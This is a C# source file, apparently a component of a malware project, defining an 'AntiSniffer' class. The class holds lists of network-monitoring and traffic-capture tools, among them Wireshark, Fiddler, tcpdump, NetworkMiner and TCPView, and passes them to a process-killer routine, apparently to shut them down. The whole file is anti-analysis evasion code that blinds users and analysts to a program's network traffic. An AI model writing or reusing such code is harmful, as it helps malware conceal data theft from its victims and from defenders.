namespace PEngine.Sticks
{
    using PEngine.Helpers;
    using System.Collections.Generic;

    public class AntiSniffer
    {
        private static readonly List<string> AppFilter = new List<string>()
        {
            "http analyzer stand-alone",
            "fiddler",
            "effetech http sniffer",
            "firesheep",
            "IEWatch Professional",
            "dumpcap",
            "wireshark",
            "wireshark portable",
            "sysinternals tcpview"
        };
        private static readonly List<string> DumpFilter = new List<string>()
        {
            "NetworkMiner",
            "NetworkTrafficView",
            "HTTPNetworkSniffer",
            "tcpdump",
            "intercepter",
            "Intercepter-NG",
        };

        public static void Inizialize()
        {
            for (int i = 0; i < AppFilter.Count; i++)
            {
                int appIndex = i;
                for (int y = 0; y < DumpFilter.Count; y++)
                {
                    int dumpIndex = y;
                    ProcessKiller.ClosingCycle(AppFilter[appIndex], DumpFilter[dumpIndex]);
                }
            }
        }
    }
}